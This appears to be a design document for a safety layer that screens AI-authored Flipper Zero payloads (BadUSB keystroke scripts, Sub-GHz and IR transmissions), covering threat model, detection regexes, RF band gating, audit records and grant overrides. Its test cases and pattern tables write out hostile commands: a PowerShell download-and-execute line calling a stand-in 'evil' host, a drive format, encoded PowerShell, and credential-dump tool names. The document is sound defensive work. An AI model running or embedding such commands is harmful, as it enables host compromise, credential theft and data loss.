# Phase 6 "Payload Forge" — Content Safety Policy

Status: DESIGN (no code yet)
Scope: `payload_badusb_*`, `payload_subghz_*`, `payload_ir_*` tool surface
Depends on (does not duplicate): `echoforge.safety.risk`, `echoforge.safety.policy`,
`echoforge.safety.permissions`, `echoforge.safety.audit`, `echoforge.safety.diff`

---

## 1. Threat model

3CH0F0RG3 is a **single-user defensive tool** for a hardware hobbyist's own
Flipper Zero. The user is simultaneously the operator, the target of any
keystrokes they author, and the party accountable for any RF they transmit.

What echoforge defends *against*:

- **Scenario A — silent drift.** The Claude agent, while composing or "fixing"
  a payload the user asked for, writes a line the user would not have
  sanctioned (credential-theft one-liner, destructive shell command,
  exfil URL). The user approves a diff quickly and misses it.
- **Scenario B — wrong context.** The user plugs into a machine that is *not*
  the one the payload was authored for (a work laptop instead of the lab VM),
  and a payload that was "fine" on the lab VM now types into a machine with
  privileges it shouldn't touch.
- **Scenario C — accidental RF harm.** A transmission the user meant to test
  once (`subghz tx`) is authored to run on loop, on a safety-relevant band,
  or with a duration that creates real-world interference.

What echoforge explicitly **does not** defend against:

- A user who decides to write and run a malicious payload. They own the
  hardware and can always bypass echoforge via `flipper.cli()` directly.
- A compromised host that re-writes files on `/ext` behind echoforge's back.
- Law-enforcement-grade forensics. The audit log is an accountability aid
  for the user, not a courtroom artefact.

The primary defensive posture is therefore **make it hard for Claude to
slip something past the user, not impossible for the user to misuse the
tool.** Friction is spent on Claude-initiated content, not on the user.

---

## 2. DuckyScript (BadUSB) content policy

Detection runs against the *authored* script text at `payload_badusb_create`
and at `payload_badusb_run` (in case a file was edited out-of-band). It
produces a list of `ContentFlag(category, pattern, snippet, severity)`; the
severity determines the action the `SafetyPolicy` takes.

### 2.1 Detection heuristics (ship as `src/echoforge/safety/content_badusb.py`)

All patterns are case-insensitive (`re.IGNORECASE`). Each row lists the
category, the regex/token to ship, the action, and representative test
cases. Regexes are deliberately *under*-clever: they catch common Claude
phrasings, not a motivated adversary.

| # | Category | Detection (ship as-is) | Action | Rationale |
|---|----------|------------------------|--------|-----------|
| D1 | PowerShell execution-policy bypass | `\bpowershell(\.exe)?\b[^\n]*\b-(ep\|executionpolicy)\s+bypass\b` | REQUIRE_MED_CONFIRM | Classic stager vector; legitimate uses exist. |
| D2 | PowerShell hidden-window | `\bpowershell(\.exe)?\b[^\n]*\b-w(indowstyle)?\s+hidden\b` | REQUIRE_MED_CONFIRM | Almost always malicious intent, but rickroll demos sometimes use it. |
| D3 | Download-and-execute, one-liner | `\b(iex\|invoke-expression)\b.*\b(iwr\|invoke-webrequest\|new-object\s+net\.webclient\|downloadstring\|downloadfile\|curl\|wget)\b` | REQUIRE_HIGH_HOLD | The canonical credential-theft stager shape. |
| D4 | cmd.exe download-and-execute | `\b(certutil\|bitsadmin)\b[^\n]*\b(-urlcache\|/transfer)\b` | REQUIRE_HIGH_HOLD | LOLBin pattern; no legitimate personal-lab use worth preserving. |
| D5 | Destructive host commands | `\b(rm\s+-rf\s+/\|del\s+/[fsq]\s+.*[a-z]:\\\|format\s+[a-z]:\|rd\s+/s\s+/q\|cipher\s+/w)` | REQUIRE_HIGH_HOLD | Any match means "this payload can wreck the host." |
| D6 | Disk wipe / dd | `\bdd\s+(if=\|of=)[^\s]*\b(/dev/[a-z]d\|\\\\.\\PhysicalDrive\d+)` | REQUIRE_HIGH_HOLD | Raw device writes. |
| D7 | Credential dump tool names | `\b(mimikatz\|lsadump\|procdump[^\n]*lsass\|sekurlsa\|comsvcs\.dll)\b` | REQUIRE_HIGH_HOLD | Tool-name tokens — narrow, low FP, high signal. |
| D8 | Keylogger install / Set-ItemProperty to Run | `\bset-itemproperty\b[^\n]*\bcurrentversion\\run\b`<br>`\breg\s+add\b[^\n]*\b(hklm\|hkcu)\b[^\n]*\brun\b` | REQUIRE_HIGH_HOLD | Persistence registration. |
| D9 | Defender / AV tamper | `\bset-mppreference\b[^\n]*\bdisablerealtime\b`<br>`\bsc\s+(stop\|delete)\b[^\n]*\b(windefend\|sense\|mpssvc)\b` | REQUIRE_HIGH_HOLD | Disabling defenses before payload runs. |
| D10 | UAC bypass tokens | `\b(fodhelper\|computerdefaults\|eventvwr\|sdclt)\.exe\b` paired with `\breg\s+add\b` in same script | REQUIRE_MED_CONFIRM | Known LOLBin targets; hobbyist may legitimately study them. |
| D11 | Network exfil — any HTTP(S) POST of env/files | `\b(invoke-webrequest\|curl)\b[^\n]*\b(-method\s+post\|-x\s+post\|--data-binary\|-F\b)` | REQUIRE_MED_CONFIRM | Flag and *show the URL*. Do not block on the URL itself. |
| D12 | Base64-encoded PowerShell | `\bpowershell(\.exe)?\b[^\n]*\b-e(nc(odedcommand)?)?\s+[A-Za-z0-9+/=]{40,}` | REQUIRE_HIGH_HOLD | Encoded command == intent to hide. Claude should never author this. |
| D13 | Raw shell via DuckyScript `STRING` into a terminal | Structural: presence of `GUI r` **AND** (`cmd` or `powershell` or `wt`) **AND** a payload token from D1–D12 | Escalate the matched payload token by one level (MED→HIGH) | Opening a shell is neutral; opening + typing a stager is not. |
| D14 | Oversized payload | `len(script) > 16 KB` or `STRING` lines > 400 | WARN (do not block) | Helps catch runaway AI generations. |

### 2.2 The rickroll clause (false-positive budget)

The test suite MUST include this exact Hak5-canonical rickroll and it MUST
classify LOW:

```
DELAY 1000
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER
```

Rules: no token above matches a plain YouTube URL typed via `STRING`. If a
rule starts flagging it, the rule is wrong.

### 2.3 Structural rules (non-content)

- **Target-host attestation.** Before `payload_badusb_run` executes, require
  an explicit `target_host_label` argument (free-text, e.g. `"lab-vm-w10"`).
  This is not validated — it just gets logged. Purpose: make the user write
  down, in the audit row, which machine they intended.
- **No silent re-run.** A `payload_badusb_run` is always at least HIGH
  (hold-to-confirm), even if the script content is clean. Typing keystrokes
  into a host is inherently physical-side-effect.

### 2.4 Representative test cases

```python
# tests/test_content_badusb.py — style matches tests/test_risk.py
@pytest.mark.parametrize("script, expected", [
    # D1
    ("GUI r\nSTRING powershell -ep bypass -c 'Get-Process'\nENTER", "MED_CONFIRM"),
    # D3 — the classic stager
    ("STRING powershell iex(iwr http://evil/s.ps1 -useb)\nENTER", "HIGH_HOLD"),
    # D5 — destructive
    ("STRING cmd /c format C: /q /y\nENTER", "HIGH_HOLD"),
    # D12 — encoded
    ("STRING powershell -enc SQBFAFgAIAAoAE4AZQB3ACAALwA=\nENTER", "HIGH_HOLD"),
    # Rickroll — must pass
    ("GUI r\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER", "LOW"),
    # Opening a terminal alone, no payload — benign
    ("GUI r\nSTRING cmd\nENTER", "LOW"),
    # Legit admin-ish but no stager: config a setting
    ("GUI r\nSTRING powershell Get-NetAdapter\nENTER", "LOW"),
])
def test_badusb_content_classification(script, expected): ...
```

---

## 3. Sub-GHz content policy

Sub-GHz transmits *radiate into the physical world* and touch legal regimes
that echoforge cannot adjudicate. Policy is therefore conservative-by-default
with a regional-profile lever the user sets once.

### 3.1 Frequency-band gating

Profile is `region: Literal["US_FCC_PART15", "EU_ETSI", "UNRESTRICTED_LAB"]`,
defaults to `US_FCC_PART15`. Carried as config, loggable, changeable only
via a grant (see §6).

| Band | US_FCC_PART15 | EU_ETSI | UNRESTRICTED_LAB |
|------|---------------|---------|------------------|
| 300–348 MHz | LOW (allowed) | BLOCKED | HIGH |
| 387–464 MHz (incl. 433.92) | LOW | LOW | HIGH |
| 779–928 MHz (incl. 868, 915) | LOW | LOW | HIGH |
| **Public-safety / airband (108–137, 144–148, 156–162, 400–420, 450–470 narrow slices, 700–800)** | **BLOCKED** | **BLOCKED** | HIGH (hold) |
| Amateur-radio slices outside ISM | REQUIRE_HIGH_HOLD + `needs_grant("amateur")` | same | HIGH |
| Anything outside Flipper's 300–348/387–464/779–928 RF front-end tuning range | BLOCKED at the hardware level — do not claim to enforce in software | — | — |

"LOW" for a band means the *band* is permitted; the individual transmission
is still rated by §3.2.

### 3.2 Per-transmission risk

| Condition | Action |
|-----------|--------|
| Duration > 30 s continuous | REQUIRE_HIGH_HOLD |
| Repeat count × frame length > 30 s effective airtime | REQUIRE_HIGH_HOLD |
| TX power > configured `max_dbm` (default: firmware max) | REQUIRE_MED_CONFIRM |
| Modulation recognized as rolling-code family (KeeLoq, Hitag, Somfy, CAME ATOMO, Nice Flor-S) via `.sub` protocol header | REQUIRE_HIGH_HOLD **and** show a banner: *"This file matches a rolling-code vehicle/garage protocol. Replay may be illegal even on your own property."* |
| `.sub` file magic not recognized / malformed header | REQUIRE_MED_CONFIRM (user sees a preview) |
| New `.sub` file authored by `payload_subghz_capture` at a band the region profile blocks | Capture allowed (RX is passive), but subsequent TX gated per §3.1 |

### 3.3 Session TX budget

Per audit-session:

- Soft cap: 120 s cumulative TX airtime across all `payload_subghz_tx` calls
  → WARN and require MED confirm on the call that would exceed it.
- Hard cap: 600 s cumulative → BLOCK; clears on session end or explicit
  `/grant tx-budget` (see §6).

Rationale: caps runaway loops and accidental retransmits; numbers chosen to
be well inside FCC Part 15 duty-cycle expectations for the ISM bands but not
so tight they trip a legitimate long capture-replay experiment.

### 3.4 Test cases

```python
@pytest.mark.parametrize("freq_hz, region, expected", [
    (433_920_000, "US_FCC_PART15", "LOW"),
    (315_000_000, "US_FCC_PART15", "LOW"),
    (315_000_000, "EU_ETSI", "BLOCKED"),
    (121_500_000, "US_FCC_PART15", "BLOCKED"),  # airband
    (162_400_000, "US_FCC_PART15", "BLOCKED"),  # NOAA WX
    (868_350_000, "EU_ETSI", "LOW"),
])
def test_band_gating(freq_hz, region, expected): ...

def test_rolling_code_keeloq_requires_hold(tmp_path):
    sub = tmp_path / "garage.sub"
    sub.write_text("Filetype: Flipper SubGhz Key File\nProtocol: KeeLoq\n...")
    # ...

def test_long_tx_escalates():
    # repeat=100, frame=500ms → 50 s > 30 s cap → HIGH_HOLD
    ...

def test_session_tx_budget_exceeded_blocks():
    # simulate 7 calls at 90 s each → 630 s cumulative → BLOCK
    ...
```

---

## 4. IR content policy

IR is short-range line-of-sight into consumer electronics. Content-level
risk is negligible and echoforge should not invent theatre here.

Policy:

- `payload_ir_tx` stays at baseline MEDIUM (as `ir_transmit` already is in
  `risk.py`).
- Single exception: `REQUIRE_MED_CONFIRM` if the `.ir` protocol string is
  literally `RAW` *and* the signal length exceeds 4 KB — catches
  pathological dumps masquerading as remotes.
- No band gating, no duration cap, no "rolling code" logic.

---

## 5. Risk-level mapping for Phase 6 tools

Slot these into `ACTION_RULES` in `risk.py`. None of these names collide
with existing rules.

| Tool | Base level | `requires_hold` | Diff preview | Notes |
|------|-----------|-----------------|--------------|-------|
| `payload_badusb_list` | LOW | no | no | Directory listing. |
| `payload_badusb_read` | LOW | no | no | File read. |
| `payload_badusb_create` | MEDIUM | no | **yes — show script diff** | Content scan runs here; flags can upgrade to HIGH. |
| `payload_badusb_run` | HIGH | **yes** | yes (show final script) | Always hold, even on clean content. Requires `target_host_label` arg. |
| `payload_badusb_delete` | HIGH | yes | no | Matches existing `delete`. |
| `payload_subghz_list` | LOW | no | no | |
| `payload_subghz_read` | LOW | no | no | |
| `payload_subghz_capture` | MEDIUM | no | summary | RX is passive; MEDIUM because it writes a file. |
| `payload_subghz_tx` | HIGH | **yes** | yes (show freq/mod/duration) | Content policy §3 can escalate or block. |
| `payload_subghz_create` / edit `.sub` | MEDIUM | no | yes | |
| `payload_subghz_delete` | HIGH | yes | no | |
| `payload_ir_list` / `_read` | LOW | no | no | |
| `payload_ir_tx` | MEDIUM | no | no | |
| `payload_ir_capture` | LOW | no | no | |
| `payload_ir_delete` | MEDIUM | no | no | IR captures are cheap to re-make. |

Every `payload_*_create` / edit MUST set `current_content` on `SafetyPolicy.assess`
so a unified diff is generated (see `diff.py`). Approval UI shows the diff
**plus** the content-flag list, not just one of them.

---

## 6. Metadata + audit

`AuditService.record_action` already takes `args_json`. Phase 6 actions MUST
include, in the args they pass through:

### BadUSB

```python
args = {
    "path": "/ext/badusb/<name>.txt",
    "content_sha256": "<hex>",          # of the script at audit time
    "content_bytes": <int>,
    "content_flags": [                  # list of ContentFlag dicts
        {"category": "D3", "pattern": "...", "severity": "HIGH_HOLD", "snippet": "..."},
        ...
    ],
    # for _run only:
    "target_host_label": "<user-supplied free text>",
    "run_trigger": "manual" | "scheduled",
}
```

Full script content is NOT stored in the audit row (could be large; could
itself contain secrets the user typed as a one-off). The `content_sha256`
plus the `snippet` per flag is enough to reconstruct what was classified.
If the user wants the full content preserved, the file itself at
`/ext/badusb/<name>.txt` is the artefact — the audit row references it.

### Sub-GHz

```python
args = {
    "signal_file": "/ext/subghz/<name>.sub",
    "file_sha256": "<hex>",
    "freq_hz": 433920000,
    "modulation": "AM650",
    "protocol": "KeeLoq",
    "repeat": 3,
    "estimated_airtime_s": 1.5,
    "region_profile": "US_FCC_PART15",
    "session_airtime_so_far_s": 42.0,
    "content_flags": [ ... ],           # rolling-code etc.
}
```

### IR

```python
args = {"signal_file": "/ext/infrared/<name>.ir", "file_sha256": "<hex>"}
```

### Edit-path (for all three)

When a payload file is being modified, record both hashes: `file_sha256_before`
and `file_sha256_after`. This threads through the existing `DiffSummary`
(which already exposes `old_size` / `new_size` / md5 for binary); we just
widen the audit payload to carry both hashes explicitly.

### Result recording

`record_result(payload=...)` already exists. Phase 6 result payloads:

- BadUSB run: `{"duration_ms": ..., "cli_output_tail": "<last 512 B>"}`
- Sub-GHz tx: `{"actual_airtime_s": ..., "cli_output_tail": "..."}`
- IR tx: `{"cli_output_tail": "..."}`

---

## 7. Override mechanics — the `/grant` hole-punch

Reuse `PermissionStore.grant(pattern, duration_s, reason)` directly. No new
module. Patterns are content-category or band-specific:

| Grant pattern | Effect | Typical duration |
|---------------|--------|------------------|
| `content:badusb:<category>` (e.g. `content:badusb:D3`) | Downgrade that flag from HIGH_HOLD → MED_CONFIRM for the grant window | 15 min |
| `content:badusb:*` | Bypass all BadUSB content flags (user is doing focused research) | 30 min max |
| `band:<hz_low>-<hz_high>` (e.g. `band:121000000-122000000`) | Unblock that exact freq range | 5 min |
| `region:UNRESTRICTED_LAB` | Switch profile for the session | session end |
| `tx-budget:+<seconds>` | Extend the hard cap by N seconds | one-shot |
| Existing path patterns (`/int/`, `*.key`) | Unchanged | Unchanged |

REPL surface:

```
/grant content:badusb:D1 15m "debugging a hak5 tutorial"
/grant band:315000000-316000000 5m "testing a keyfob I own"
/grant region:UNRESTRICTED_LAB session "isolated faraday cage"
/grants                # list active
/revoke <pattern>
```

All grant/revoke events MUST write an audit row with `action="grant"` or
`action="revoke"`, `args={"pattern":..., "duration_s":..., "reason":...}`,
`verdict="allow"`. The grant reason is mandatory — empty reason refuses
the grant. This creates an accountability trail: every bypass the user
makes is a line in the log with a written justification.

Grants are **never** auto-created by Claude. Claude may *suggest* the exact
`/grant ...` command to run, but must not issue it. This is the single line
between "Claude helped me" and "Claude did it for me."

---

## 8. Anti-patterns to avoid

1. **Don't ship a URL blocklist.** Any "attacker-controlled domain" list
   will be stale in a week and trivially bypassed by IP literal, domain
   tunneling, or `file:///`-style tricks. Flag *the shape of exfil*
   (POST with body to any external host) and **show the URL to the user**
   — don't claim to judge it.
2. **Don't claim obfuscation detection.** If we try to unwrap base64 /
   reverse-string / char-code-array payloads we'll get it wrong, give the
   user false confidence, and encourage the "clever wrapper" arms race.
   Per D12: we flag *the presence* of encoded PowerShell as HIGH and stop
   there. Document this as a blind spot in the user-facing docs.
3. **No silent autocorrect.** Never have the policy *modify* a payload to
   "sanitize" it. Either approve-as-is, require confirmation, or block.
   A silent edit breaks the user's mental model of what's on disk.
4. **Don't gate IR.** IR is line-of-sight into a TV. Over-engineering it
   trains the user to approve blindly, which burns credibility for the
   real gates.
5. **Don't reimplement `RiskLevel`.** Content flags map onto the existing
   four levels via §5's table. We do not introduce a fifth level or a
   parallel severity enum.
6. **Don't persist full payload content in the audit DB.** Hash + snippet
   per flag is enough. The file on disk is the artefact of record.
7. **Don't rate-limit purely by wall clock.** "Only 5 TX per minute" sounds
   safe but punishes legitimate rapid iteration while a motivated attacker
   just waits. §3.3 uses *airtime* budget, not call-count, because airtime
   is what the physics cares about.
8. **Don't pretend to know jurisdiction.** `region` is a user-supplied
   profile, not a GeoIP lookup. We document "you told us US_FCC_PART15;
   we gate accordingly" and leave the legal determination to the user.

---

## 9. Explicit non-goals

- **echoforge will not prevent a determined user from running any payload.**
  `flipper.cli()` and direct CLI access bypass Phase 6 entirely; this is
  intentional and documented. The policy layer protects against *silent
  Claude drift*, not against the authenticated operator.
- **echoforge will not detect polymorphic / encoded / multi-stage payloads
  with high confidence.** Encoded PowerShell is flagged as a *shape*
  (D12); we do not try to decode it.
- **echoforge will not enforce country-specific RF law.** The `region` profile
  is an advisory lever the user sets. Wrong profile → wrong gates. That is
  the user's responsibility and is recorded in every TX audit row.
- **echoforge will not MITM the Flipper.** The on-device firmware is the
  ultimate gate for what the radio can physically do; echoforge's checks
  are advisory-to-Claude, not a hardware lockout.
- **echoforge will not block `factory_reset` differently than today.** That
  reference gate stays exactly as `risk.py` defines it (BLOCKED unless
  explicitly unlocked). Phase 6 adds *peer-level* gates, not a rewrite.
- **echoforge will not scan files outside the tool-call boundary.** If the
  user manually edits `/ext/badusb/x.txt` in another tool and then calls
  `payload_badusb_run`, the content scan runs at run-time — but we will
  not walk the SD card proactively.

---

## 10. Test-suite additions (style: `tests/test_risk.py`)

New files:
- `tests/test_content_badusb.py` — §2 detection matrix, including the
  rickroll-must-not-flag case.
- `tests/test_content_subghz.py` — §3 band gating, rolling-code detection,
  duration/airtime caps, session budget.
- `tests/test_content_grants.py` — §6 grant-pattern matching (existing
  `PermissionStore` covers the mechanics; these tests cover the new
  pattern schemes).
- `tests/test_phase6_policy.py` — end-to-end: `SafetyPolicy.assess` on each
  new action name returns the verdict §5 promises.

All tests run without hardware, without network, pure unit. Parametrized
tables, no fixtures beyond a shared `assessor` / `policy`. Target: <250 ms
total additional runtime on the existing suite.

---

## 11. Open questions (not blockers)

- Region profile: should `UNRESTRICTED_LAB` require a physical-switch
  gesture (e.g. a short-range confirmation via the Flipper's own buttons)?
  Defer to Phase 7.
- Content flags on *edit* vs on *create*: currently both run the same
  scan. If `git blame`-style attribution matters, revisit.
- Should we hash-and-remember flagged scripts across sessions so the user
  isn't re-prompted for the same file? Probably yes; deferred.
